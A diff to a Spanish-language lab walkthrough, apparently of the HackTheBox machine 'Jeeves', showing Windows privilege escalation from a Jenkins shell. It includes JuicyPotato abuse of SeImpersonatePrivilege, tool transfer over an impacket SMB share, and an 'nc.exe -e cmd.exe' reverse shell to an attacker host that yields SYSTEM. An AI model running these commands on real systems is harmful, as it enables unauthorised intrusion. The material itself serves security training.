@@ -128,5 +128,111 @@ whoami
 jeeves\kohsuke
 
 ```
+### Observamos que tiene el privilegio impersonate habilitado, podemos utilizar `petitpotato`
 
+```
+C:\Users\Administrator\.jenkins>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State
+============================= ========================================= ========
+SeShutdownPrivilege           Shut down the system                      Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeUndockPrivilege             Remove computer from docking station      Disabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled  <----
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+SeTimeZonePrivilege           Change the time zone                      Disabled
+
+```
+
+### Vamos a descargar `juicy-potato` y transferilo a la maquina victima. los sitios  que podemos utilizar son:
+
+(https://ohpe.it/juicy-potato/CLSID/)
+
+(https://github.com/ohpe/juicy-potato)
+
+### Descargue la herramienta y prendi el servidor en python e intente usar certutil pero el equipo no tiene la herramienta instalada, para lo cual recorde que tiene el servicio smb abierto podemos utilizar `impacket smb server`
+
+`impacket-smbserver smbshare $(pwd) -smb2support`
+
+```
+└─# impacket-smbserver <directorio> $(pwd) -smb2support
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+
+```
+
+### y en la maquina vitima hacemos una peticion para ver el directorio 
+
+```
+dir \\10.10.14.2\directorio
+ Volume in drive \\10.10.14.2\directorio has no label.
+ Volume Serial Number is ABCD-EFAA
+
+ Directory of \\10.10.14.2\directorio
+
+06/28/2024  10:16 PM           347,648 JuicyPotato.exe
+06/28/2024  10:34 PM            28,160 nc.exe
+               2 File(s)        375,808 bytes
+               0 Dir(s)  15,015,393,145,319,977,344 bytes free
+
+```
+
+### Subimos los ejecutables que necesitamos con ayuda de smb con `copy`
+
+### y ejecutamos el juicypopato par que con cosola se envie en nc dirigido al atacante.
+
+### para la probar los CLSID se puede hacer con el siguiente comando antes validar que SO se tiene con `system info`
+
+```
+C:\Users\Administrator\.jenkins\tmp>.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {0134A8B2-3407-4B45-AD25-E9F7C92A80BC}
+.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {0134A8B2-3407-4B45-AD25-E9F7C92A80BC}
+Testing {0134A8B2-3407-4B45-AD25-E9F7C92A80BC} 1337
+......
+[+] authresult 0
+{0134A8B2-3407-4B45-AD25-E9F7C92A80BC};NT AUTHORITY\SYSTEM
+
+[+] CreateProcessWithTokenW OK
+
+```
+### Despues de probar el CLSID lanzamos nc con redirecion de cmd al equipo atante
+
+`C:\Users\Administrator\.jenkins\tmp>.\JuicyPotato.exe -l 1337 -t * -p c:\windows\system32\cmd.exe -a "/c C:\Users\Administrator\.jenkins\tmp\nc.exe -e cmd.exe 10.10.14.2 4445"  -c {0134A8B2-3407-4B45-AD25-E9F7C92A80BC}`
+
+```
+C:\Users\Administrator\.jenkins\tmp>.\JuicyPotato.exe -l 1337 -t * -p c:\windows\system32\cmd.exe -a "/c C:\Users\Administrator\.jenkins\tmp\nc.exe -e cmd.exe 10.10.14.2 4445"  -c {0134A8B2-3407-4B45-AD25-E9F7C92A80BC}
+.\JuicyPotato.exe -l 1337 -t * -p c:\windows\system32\cmd.exe -a "/c C:\Users\Administrator\.jenkins\tmp\nc.exe -e cmd.exe 10.10.14.2 4445"  -c {0134A8B2-3407-4B45-AD25-E9F7C92A80BC}
+Testing {0134A8B2-3407-4B45-AD25-E9F7C92A80BC} 1337
+......
+[+] authresult 0
+{0134A8B2-3407-4B45-AD25-E9F7C92A80BC};NT AUTHORITY\SYSTEM
+
+[+] CreateProcessWithTokenW OK
+
+```
+
+### Pwned
+
+```
+└─# rlwrap -cAr nc -lvnp 4445
+listening on [any] 4445 ...
+connect to [10.10.14.2] from (UNKNOWN) [10.10.10.63] 49707
+Microsoft Windows [Version 10.0.10586]
+(c) 2015 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+```
 
